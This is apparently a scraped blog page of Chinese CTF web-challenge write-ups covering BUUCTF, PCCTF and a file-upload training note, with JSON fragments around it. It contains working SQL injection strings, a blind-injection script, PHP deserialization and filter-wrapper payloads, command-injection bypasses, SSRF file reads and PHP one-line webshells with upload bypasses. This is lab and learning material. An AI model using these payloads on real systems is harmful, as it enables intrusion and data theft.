strlower(form.username.data) session[&#39;name&#39;] &#x3D; name user &#x3D; User.query.filter_by(username&#x3D;name).first() if user is None or not user.check_password(form.password.data): flash(&#39;Invalid username or password&#39;) return redirect(url_for(&#39;login&#39;)) login_user(user, remember&#x3D;form.remember_me.data) return redirect(url_for(&#39;index&#39;)) return render_template(&#39;login.html&#39;, title &#x3D; &#39;login&#39;, form &#x3D; form)@app.route(&#39;&#x2F;logout&#39;)def logout(): logout_user() return redirect(&#39;&#x2F;index&#39;)@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#39;login&#39;)) form &#x3D; NewpasswordForm() if request.method &#x3D;&#x3D; &#39;POST&#39;: name &#x3D; strlower(session[&#39;name&#39;]) user &#x3D; User.query.filter_by(username&#x3D;name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#39;change successful&#39;) return redirect(url_for(&#39;index&#39;)) return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form) 这里面有三个解 直说其中一个，也是最简单的 Unicode欺骗这个解法好像才是这个题目想要考查的点，我们可以发现，不管是login、register还是change页面，只要是关于session[‘name’]的操作，都先用了strlower函数将name转成小写，但是python中有自带的转小写函数lower，这里重写了一个，可能有点猫腻，于是找到strlower函数的定义 123def strlower(username): username &#x3D; nodeprep.prepare(username) return username 这里用到了nodeprep.prepare函数，而nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep，在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距这么大，估计是存在什么漏洞，于是搜索一下nodeprep.prepare，找到一篇unicode安全的文章，https://paper.tuisec.win/detail/a9ad1440249d95b 这里原理就是利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。 所以当我们用ᴬdmin注册的话，后台代码调用一次nodeprep.prepare函数，把用户名转换成Admin，我们用ᴬdmin进行登录，可以看到index页面的username变成了Admin，证实了我们的猜想，接下来我们就想办法让服务器再调用一次nodeprep.prepare函数即可（改一下密码重新登录）。 我们发现在改密码函数代码里，也用到了nodeprep.prepare函数，也就是说，我们在这里改密码的话，先会把username改为admin，从而改掉admin的密码。 然后用admin和改的密码的登录，即可获取flag。 使用的是admin而不是ᴬdmin 还有两种解法，转自：https://www.jianshu.com/p/f92311564ad0 [极客大挑战 2019]LoveSQL打开页面 题目已经提醒了是SQL注入，所以在用户名处进行注入，看看能否进行报错，说明存在SQL注入而且也是单引号出错的 将后面加入注释符试试 发现返回了md5值，经过尝试发现无法解密，说明错误 直接在输入框没办法进行，在URL中试试，打开火狐使用hackbar当然也可以不用，只不过这样看的更直观而已 这样发现显示了不是之前的password而是显示了input。。。，这里可以猜测#不能使用，使用%23试试 使用%23之后发现页面返回正常 尽心测试注入字段，没有字段4，尝试一下字段3看看 发现字段3页面返回正常 查看注入点，username需要为错 查看数据库 查看表 1-admin&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;1 我们查询一下l0ve1ysq1这个表，发现返回了用户名和密码，看看有没有可用的信息 1-admin&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1 将页面往后拉，发现出现了flag，复制提交即可 1-admin&#39; union select 1,2,group_concat(username,password)from l0ve1ysq1%23&amp;password&#x3D;1 [极客大挑战 2019]PHP查看页面 根据题目的提示可以分析是信息泄露，我们使用dirsearch来扫描一下目录看看有没有什么敏感的目录 这个我们在kali中安装一下dirsearch 安装很简单，直接在GitHub中下载，然后解压就可以 地址：https://github.com/maurosoria/dirsearch 解压后进到dirsearch-master这个目录中，右键打开终端使用以下命令 1.&#x2F;dirsearch.py -u http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn -e php dirsearch参数介绍 -u 指定URL -e 扫描网站语言 -w 可以加上自己的字典（带上路径） -i 递归跑（查到一个目录后，在目录后在重复跑，很慢，不建议用） –random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加） 我们这里就指定php来跑 跑完之后发现有一个www.zip的压缩包，有点可疑，在页面中访问一下 1http:&#x2F;&#x2F;27f2f340-235e-47d8-8df9-f2a984334abe.node3.buuoj.cn&#x2F;www.zip 访问上面链接之后会下载一个zip的文件，打开之后发现有三个php文件 分别是class.php、flag.php，index.php这三个php 文件，打开看看 index.php 查看index.php文件，这里只是筛选了php，还有一些HTML直接省略 这里可以看到包含了class.php文件和GET传参select的值，然后反序列化该值，接着看class.php 12345&lt;?php include &#39;class.php&#39;; $select &#x3D; $_GET[&#39;select&#39;]; $res&#x3D;unserialize(@$select);?&gt; class.php 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125; function __wakeup()&#123; $this-&gt;username &#x3D; &#39;guest&#39;; &#125; function __destruct()&#123; if ($this-&gt;password !&#x3D; 100) &#123; echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;; die(); &#125; if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123; global $flag; echo $flag; &#125;else&#123; echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;; die(); &#125; &#125;&#125;?&gt; 在调用__destruct()的时候，username=admin，password=100的时候输出flag，因此我们 需要构造一个序列化，使得username=admin，password=100 可以将下面的代码复制到在线php执行或者复制到phpstudy的www目录下访问都可以，就会输出值 在线php网址：https://tool.lu/coderunner/ 123456789101112131415&lt;?phpclass Name&#123; private $username &#x3D; &#39;nonono&#39;; private $password &#x3D; &#39;yesyes&#39;; public function __construct($username,$password)&#123; $this-&gt;username &#x3D; $username; $this-&gt;password &#x3D; $password; &#125;&#125;# 进行实例化$a &#x3D; new Name(&#39;admin&#39;, 100);$b &#x3D; serialize($a);echo $b;?&gt; 复制将上面代码复制出来 1O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125; 其中name后面的2，代表类中有2个属性，但如果我们把2改成3，就会绕过__wakeup()魔法函数。而且因为是private声明，我们需要在类名和字段名前面都会加上\\0的前缀 1?select&#x3D;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; PHP魔法函数 php类中包含了一些魔法函数，这些函数可以再脚本的任何地方不用声明就可以使用 与php（反）序列化有关的魔法函数 1234567891011_construct() &#x2F;&#x2F; 当一个对象创建时调用_destruct() &#x2F;&#x2F; 当对象被销毁时触发_wakeup() &#x2F;&#x2F; 使用unserialize时触发_sleep() &#x2F;&#x2F; 使用serialize时触发_toString() &#x2F;&#x2F; 把类当做字符串使用的时触发_get() &#x2F;&#x2F; 用于从不可访问的属性读取数据————————————————————————————————————————————————_set() &#x2F;&#x2F; 用于将数据写入不可访问的属性_isset() &#x2F;&#x2F; 在不可访问的属性上调用isset()或empty()触发_unset() &#x2F;&#x2F; 在不可访问的属性上使用unset()时触发_invoke() &#x2F;&#x2F; 当脚本尝试将对象调用为函数时触发 [SUCTF 2019]CheckIn打开页面 是一个文件上传漏洞， 尝试一下上传一句话木马 返回了illegal suffix!，非法后缀，那么就上传图片码 将文件后缀改为图片后缀 返回了&lt;? in contents!，说明不能使用&lt;? 然后将内容伪造成&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;123&#39;]);&lt;/script&gt; 返回了exif_imagetype:not image!，意思这个文件不是图像，这个简单伪造一个文件头就行，在文件头部加入GIF89a来进行伪造 伪造之后进行提交，发现成功提交了 经过上面的错误可以得到以下几点内容 1、不能上传带有&lt;?的文件 2、上传文件必须含有图片头 经过以上两点内容，我们可以先上上传一个.user.ini进去，用来解析含有php代码的图片，即可达到绕过限制的目的 介绍.user.ini.user.ini上传\\隐藏后门 上传条件： 服务器脚本语言为PHP 服务器使用CGI/FastCGI模式 上传目录下要有可执行的php文件 两种参数介绍 123GIF89a &#x2F;&#x2F;绕过exif_imagetype()auto_prepend_file&#x3D;a.jpg &#x2F;&#x2F;指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file&#x3D;a.jpg &#x2F;&#x2F;解析后进行包含 优势：跟.htaccess后门比，适用范围更广，nginx/apache/IIS都有效，而.htaccess只适用于apache 这里我们就构造.user.ini文件，内容是auto_prepend_file=图片名称 这里我们的图片名称是123.jpg所以就要将.user.ini里的图片名称改为123.jpg 然后进行上传，返回了一个index.php文件 上传的地址，在后面加上index.php然后进行访问 url：http://dc82f315-0e45-4911-9f8d-05bb8e8d0d23.node3.buuoj.cn/uploads/adeee0c170ad4ffb110df0cde294aecd/index.php 页面返回了这个文件伪造的头部，这样说明成功了，如果出现错误，就例如页面打不开等，检查一下.user.ini和图片码中的代码结尾处是否有空格，图片码没试过，但是.user.ini如果你在内容的后面加空格的话，然后上传，是无法显示内容的，菜刀、蚁剑也连接不上 这样复制url在蚁剑中进行连接，打开蚁剑 ，右键空白处，点击添加数据，粘贴URL输入密码，然后测试连接，连接成功后，点击添加。完成后双击添加的数据即可进入 在左上角目录列表处点击/，查看全部目录，将内容拉倒最底部，会发现一个flag文件，双击打开里面就是flag值，复制提交即可 打开flag文件后显示以下内容 [极客大挑战 2019]Knife打开页面 其实看到题目的时候应该就知道这个一个关于shell连接的题 看到内容已经给你答案了 直接复制URL到菜刀或者蚁剑，密码页面已经给到了，就是Syc，连接即可 进入目录后还是点击/查看全部目录，然后拉到最后，找到flag文件，双击文件进去，就可以看到flag 复制flag提交即可 [极客大挑战 2019]Http查看页面 看了看发现没有什么关注的点 使用burp抓包看看，将包发送到Repeater模块，审计一下源码。发现一个Secret.php，在URL中访问一下看看返回什么 页面返回，It doesn&#39;t come from &#39;https://www.Sycsecret.com&#39;说不是从后面的网址访问的，这个一看就是要伪造Reperer 发现返回了，Please use &quot;Syclover&quot; browser，让其限制浏览器，伪造一下User-Agent， 发现又返回说不是本地访问，在伪造一下X-Forwarded-For 伪造之后发现返回flag，左侧红线处是伪造的内容。复制提交即可 [GXYCTF2019]Ping Ping Ping查看页面 可以根据题目和网页内容可以看出这可以ping地址 在URL构造一下试试，发现成功了。可以猜测这是命令执行 使用分号分隔，然后尝试ls命令看看能否列出文件 发现使用ls后成功将文件列出来了。看到有flag文件，我们使用cat命令来查看 发现提示非法空格，说明空格不能使用，这样就需要绕过空格 绕过空格有一下几种内容 %20、%09、$IFS、${IFS} 、$IFS$1、&lt; 、&lt;&gt; 、{cat,flag.php} 这里经过测试发现$IFS$1可以使用，然后查看一下index.php文件 得到以下代码 可以看到过滤了&amp;，/，?，*，&lt;，&gt;，\\x{00}-\\x{1f}，‘，”，\\，(，)，[，]，{，}，空格，bash，flag 123456789101112131415161718&#x2F;?ip&#x3D;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;&#x2F;&quot;, $ip, $match))&#123; echo preg_match(&quot;&#x2F;\\&amp;|\\&#x2F;|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;&#x2F;&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);&#125;?&gt; 这里可以使用变量拼接绕过 1?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php 页面返回正常的时候按F12查看源码 发现flag就在源码中，复制提交即可 [ACTF2020 新生赛]Include打开页面 发现有一个超链接，点击进去看看 返回了Can you find out the flag?，但是发现URL中有?file=flag.php，第一反应就是用php://input伪协议 使用php://input伪协议页面返回，发现被过滤了 然后考虑一下是不是php://filter伪协议 尝试一下看看页面返回 Payload：php://filter/read=convert.base64-encode/resource=flag.php 页面返回了base64，复制解密一下 发现成功返回了flag，复制提交即可 [CISCN2019 华北赛区 Day2 Web1]Hack World打开页面 在登录框中输入数字看看返回什么东西 这里就先输入1，返回了Hello, glzjin wants a girlfriend. 输入2看看，返回了Do you want to be my girlfriend?，当输入3的时候页面返回了错误 这里就可以猜测是sql注入了，而且有两个字段，然后我们按照平常的姿势来注入，发现都不行，使用burpsuite抓包进行爆破，看看过滤了哪些字符，可以看到482长度的都是过滤了的 这样我们就可以使用异或来进行注入 这里的两个flag是因为页面上已经写上了 pyload：0^(ascii(substr((select(flag)from(flag))1,1)&gt;1) 这样因为是盲注手注也行，但是太慢了，这里我们使用脚本 1234567891011121314151617181920212223242526272829303132333435import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;29818d74-a256-4cfa-8521-0a24e85f886c.node3.buuoj.cn&#x2F;index.php&quot;flag&#x3D;&#39;&#39;# flag长度for x in range(1,50):# ascii常用字符 right&#x3D;137 left&#x3D;30# 二分法，去头去尾取中间 mid&#x3D;(right+left)&#x2F;&#x2F;2 while right &gt; left: payload &#x3D; &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)&quot; % (x, mid) data&#x3D;&#123; &quot;id&quot;:payload &#125; resopnse&#x3D;requests.post(url,data&#x3D;data) # 这里多行注释不能使用单引号，因为if的下面的Hello是单引号，这样就会导致报错 &quot;&quot;&quot; Hello是因为当你输入1的时候返回的值 值能取逗号前或者逗号后的值，不能乱取。 &quot;&quot;&quot; if &#39;Hello&#39; in resopnse.text: # 每次最左侧都往又位移1次，如果不加1就会一直返回一个值 left&#x3D;mid+1 else: # 因为二分法，最左侧就是中间位置。 right&#x3D;mid mid&#x3D;(right+left)&#x2F;&#x2F;2 flag+&#x3D;chr(int(mid)) print(flag) [网鼎杯 2018]Fakebook打开页面 扫描一下目录 可以看到有一个robots.txt文件，在页面中打开看看 页面有返回一个.bak后缀的文件 先注册个账号，这是我注册好的，点击蓝色超链接 在访问/user.php.bak看看下载下来一个.apk的文件，然后查看返回一下内容 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpclass UserInfo&#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); &#x2F;&#x2F; 输出一个curl会话 curl_setopt($ch, CURLOPT_URL, $url); &#x2F;&#x2F; 设置需要抓取的URL curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); &#x2F;&#x2F; 设置curl参数，要求结果保存到字符串中还是输出到屏幕上 $output &#x3D; curl_exec($ch); $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); &#x2F;&#x2F; 关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄 return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125;&#125; 审计源码发现get()函数存在SSRF(服务端请求伪造)漏洞 这里先随便注册个用户登录 登录后发现有?no=1，第一反应就是注入 先测试报错，看看有没有注入，加入单引号报错，说明有注入 查看注入点，注意这里只是用单引号看看会不会报错，但是注入的时候是不加单引号的，使用order by 5发现没有5这个字段，然后尝试4 order by 4发现页面返回正常，说明注入字段是4，然后经过测试union select被过滤了 然后因为页面报错，我们使用报错注入试试，因为反正知道了注入点有四个，基本上都是后两个，尝试一下就行 payload:?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) 页面返回了users，当前数据库是users，在查看表 查看表 payload：?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1) 返回了以下数据，因为不知道flag在哪，挨个查看一下吧，还是先查看username和passwd 着了查其他的都查看了，有用的数据在data，这里查看data数据 payload：?no=1 and updatexml(1,concat(3,&#39;~&#39;,(select group_concat(data ) from users)),1) 页面返回了一个序列化格式这个正是跟.apk里面的内容一样 选取.apk中有用的数据 12345678910111213class UserInfo&#123; public $name &#x3D; &quot;1&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125;&#125; payload: 1&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; 发现页面并没有回显，查看源码 在iframe标签中可以看到flag，复制提交就可以 [ACTF2020 新生赛]Exec打开页面 可以看到，是一个ping地址的，这里就可以第一时间想到127.0.0.1;ls 或者将分号改为|管道命令， 使用127.0.0.1;ls，发现页面返回index.php，说明命令有效， 使用cat查看flag看看，经过测试127.0.0.1;cat flag.php和127.0.0.1;cat flag.txt都没有，这里在尝试127.0.0.1;cat 、flag发现成功返回了flag，复制提交即可 [强网杯 2019]高明的黑客不会， [极客大挑战 2019]BabySQL查看页面 使用admin，admin看看能不能登录上 页面返回用户名密码错误，而且可以看到输入的内容在url中显示，在结合题目，尝试一下有没有sql注入 使用万能单引号，可以看到页面返回了错误，说明存在sql注入， 使用注释符看看页面能否返回正常，这里使用#号–号都被注释了不能使用，%23可以使用 进行注入测试，查看注入点 可以看到使用order by的时候or被过滤了，我们尝试一下将or双写 可以看到虽然双写绕过了但是还是报错不能查看注入点，使用联合查看，测试注入点 发现页面将union select给过滤了，我们继续进行双写 可以看到双写可以绕过，页面返回了不同列数，说明当前列数不对 经过测试发现当列数时3的时候页面返回正常，这样知道了注入点就可以进行注入了 查看当前数据库 payload：?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,database()%23 知道数据库了查看表名，可以看到报错了，在information的地方，但是or已经双写了，所以猜测将from给过滤了 将from进行双写，双写后发现还报错了，这次报错位置在=等于号前，因为前面的table和schema都没有过滤，所以确定where过滤了 再次将where双写试试，这次终于成功的返回了表名，’b4bsql,geekuser’ payload：?username=admin&amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(table_name)frfromom infoorrmation_schema.tables whwhereere 知道表名了，查看字段，测试一下b4bsql表 payload：?username=admin &amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(column_name)frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;%23 查看username字段的内容，可以看到有一个flag的用户名，我们查看一下密码，看看该用户名对应的是不是falg信息 payload：?username=admin &amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(username)frfromom b4bsql%23 发现成功返回了flag，如果现实不全可以查看源码进行复制 payload：?username=admin &amp;password=admin&#39; ununionion seselectlect 1,2,group_concat(password)frfromom b4bsql%23 [ZJCTF 2019]NiZhuanSiWei查看页面 第一个绕过 if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)) 需要让$text输入 ”welcome to the zjctf“ 传入文件中才能进行后面的步骤， 这里可以用php://input伪协议在以POST形式传入“ welcome to the zjctf “ 也可以用data伪协议传参 payload：?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= 当页面返回这个的时候就说明正确 第二个绕过 123456789if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); &#x2F;&#x2F;useless.php $password &#x3D; unserialize($password); echo $password; &#125;&#125; 这里有file参数可控，但是无法直接读取flag，可以直接读取/etc/passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用： ?file=useless.php 所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。 file=php://filter/read=convert.base64-encode/resource=useless.php 跟第一个绕过放一起就是 payload：?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 使用base64在线解码 解码之后得到以下值 12345678910111213&lt;?php class Flag&#123; &#x2F;&#x2F;flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 构造序列化 12345678910111213141516&lt;?php class Flag&#123; public $file&#x3D;&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;); &#125; &#125; &#125;$a &#x3D; new Flag();echo serialize($a);?&gt; 输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 构造最后payload 1?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 页面返回这个 按F12在源码中","categories":[],"tags":[]},{"title":"PCCTF","slug":"PCCTF","date":"2020-07-25T01:17:06.969Z","updated":"2020-06-25T11:28:26.616Z","comments":true,"path":"2020/07/25/PCCTF/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/PCCTF/","excerpt":"","text":"WEBWEB 1打开页面 发现红框处有变量覆盖漏洞 这样就可以构造payload，其中的哈希值必须和key值相等， 1?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3 页面返回flag，提交即可 Web 2打开页面 红框处使用chr()函数 chr()函数的处理方式是将w3lc0me_To_PCCTF的每一个值转换成ascii然后每一个值得ascii+256， 还有intval函数的值需要进行绕过 intval()函数在处理16进制时存在问题,但强制转换时是正常的 来绕过第二个判断，intval(字符串)为0 但是intval(字符串+1) 会自动转换成数值，不过php7已经修复了，这里我们传入password的参数6e4 payload：&amp;password=6e4&amp;value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=336&amp;value[12]=323&amp;value[13]=323&amp;value[14]=340&amp;value[15]=326 这样就成功的返回了flag WEB 3打开页面， 发现过滤了很多符号， 而且可以看到底下可以ping IP，这样就可以联想到命令执行漏洞，但是上面吧符号都给过滤了，所以没办法使用上面的符号进行命令执行，但是发现并没有过滤%0a，可以尝试一下这个命令 这样构造的payload：?ip=127.0.0.1%0acat /flag Web4打开页面 发现左上角有一个flag，hint，看看flag有什么 发现flag里面说我们的ip是39.77.85.15第一时间就是想到伪造IP，X-Forwarded-For 使用burp进行抓包然后进行伪造IP看看返回什么值，伪造ip之后经过测试发现伪造的IP是可变的，这里想到XFF的SSTI注入 然后构造一下XFF的伪造ip，发现成功返回了flag，复制提交即可 WEB 5打开页面 一看就是文件上传 上传构造一句话，然后上传，上传php文件发现返回文件名称错误，说明不能上传php文件 所以我们需要构造图片码试试，过滤了以下内容，可以看到&gt;括号被过滤了，ph被过滤了 所以我们就要构造一个没有&gt;的payload 以下的payload就没有&gt;尖括号，再次进行上传 1&lt;?&#x3D;eval($_POST[123]); 发现这样就成功上传了，但是直接连接的话是连接不上的，会报错的 所以想到上传.user.ini，但是发现过滤了auto这样就不能上传.user.ini了，想到还有一个.htaccess，不过是利用htaccess的特性，开启php的short_open_tag支持。 上传的时候需要修改content-type后可以上传.htaccess。自然而然想到上传内容为如下的.htaccess文件修改apache配置，将jpg按php解释执行。 1AddType application&#x2F;x-httpd-php .jpg 但是ph被过滤了，如果直接上传会报错， 这里可以使用apache配置文件的多行模式，将一行配置拆为多行。 12AddType application&#x2F;x-httpd-p\\hp .jpg 由于php的执行还需要&lt;?php ，所以需要开启short_open_tag。用同样的办法写好。 最终 .htaccess 的写法 1234AddTyppe application&#x2F;x-httpd-p\\hp .jpg\\p\\hp_value short_open_tag on 注意：这里的 .htaccess中的. 前面不能加任何东西，比如：1.htaccess 然后进行最终上传 然后放行这个包，这样查看页面就显示成功上传了 图片码直接上传即可 构造URL 1http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;uploads&#x2F;9465e99a7262f75468c0dc54c4f76954&#x2F;sss.jg 使用蚁剑连接， 点击根目录，找到flag文件，双击打开，flag就在其中了 Misc（杂项）Don’t wait!点击题目，发现让我们下载一个文件 先进行下载，下载完进行解压，是一个exe后缀的应用 打开看看 等了好长一段时间发现，发现返回了flag，但是这种办法是非常非常非常慢的 我们将exe改为txt，然后进行搜索flag就能获得了 签到按照要求关注就行 F**k打开网址 需要下载一个apk文件，进行下载 因为是zip文件，进行解压，解压完得到了这个文件 这里使用010Editor来查看他的16进制，往下拉，会发现许多这种密文，将这些密文全部复制 打开URL的控制台，然后粘贴上去，按一下回车，就成功的显示出flag来了 比签到还水打开网址看看 需要下载一个zip压缩包，进行下载 下载完如果直接打开，会报错。 这样我们使用binwalk看看有没有隐藏文件 可以看到有一个隐藏图片，我们进行分离出来 使用binwalk -e 文件名，发现这并不是我们要的文件，这时候就想到了，可能不能使用binwalk进行分离，试试foremost 命令：foremost 文件名 -o 自己设置文件名 我们设置的输出文件名是123.这时候桌面就多出了123文件 打开看看有没有我们需要的，分离出一个二维码，直接扫一下就行了，就返回flag了 Backdoor可以看到提示是用wireshark来分析 下载文件 下载完之后使用wireshark打开文件 随便点击一个协议，进行追踪流 右键，追踪流，右键什么协议就追踪什么流， 我们右键的是TCP所以追踪TCP流 发现里面有很多编码，其实都经过尝试了，都是没用的，往下划，看看有没有有用的信息 可以看到这一大串中在z1后是16进制，文件头是ZIP的，所以我们复制z1后的16进制 复制完之后在010Editor中粘贴 另存为ZIP文件，然后进行解压，成功返回了二维码，扫描一下即可 Game下载文件 打开发现是个游戏，要坚持60s不死，就会返回flag 当我们放大这个游戏的时候，发现旁边是空白的，然后我们可以移动到空白的地方。这是树叶方块碰不到，然后等60s在出来死掉就出现flag了 这样就出现flag了，这是一种方法。 还有一种方法 使用binwalk查看隐藏内容，发现有很多 然后将其分离出来，我们这里使用的是foremost 分离出两个文件，一个是GIF里面全是图片没有什么值得关注的 但是在zip文件中有一个压缩包，进行解压，然后进去得到三个文件夹 image文件夹，也是图片没有用，这样就剩下两个文件夹了，经过测试我们发现flag在cn\\bjsxt\\plane下的PlaneGameFrame.class里面 打开该文本，搜索flag，就找到了， fuck_4打开网页需要下载一个zip的文件，下载下来 下载完成后打开，发现有一个flag文本，打开看看 打开后发现需要输入文件密码，我们不知道密码，然后使用ARCHPR进行爆破一下，这样成功得到密码。 将密码输入，打开文件，这样就成功得到了密码","categories":[],"tags":[]},{"title":"神马培训","slug":"神马培训","date":"2020-07-25T01:16:56.509Z","updated":"2020-07-16T01:02:18.316Z","comments":true,"path":"2020/07/25/神马培训/","link":"","permalink":"https://zhanqiaozai.github.io/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/","excerpt":"","text":"文件上传找到上传点 上传一张正常图片，可以看到图片可以上传成功 再次上传该图片，使用burp抓包，发送到Repeater模块，修改文件后缀，将jpg文件后缀更改为php文件后缀，然后运行，查看页面是否返回路径，返回路径说明上传成功，相反，失败。 复制上传路径，在页面打开看看返回信息，如果能返回信息，说明正确。因为是将后缀改成了php所以页面返回乱码，而不是图片 在图片的乱码中添加一句话木马（尽量不要添加在图片中乱码括号的内部），再次进行提交，查看页面是否返回上传路径 这里加入phpinfo是为了测试页面是否返回成功，如果返回成功显示phpinfo 123&lt;?php eval(@_POST[\"pass\"]);phpinfo();?&gt; 复制该路径，在页面中进行访问 页面返回了phpinfo说明上传成功 使用蚁剑或者菜刀进行连接，复制url，蚁剑连接密码就是一句话木马中，方括号中的内容pass 这样就连接成功了，一般flag文件都在根目录下。 选择到根目录，找一下flag文件 找到flag文件，双击打开，里面就是flag值 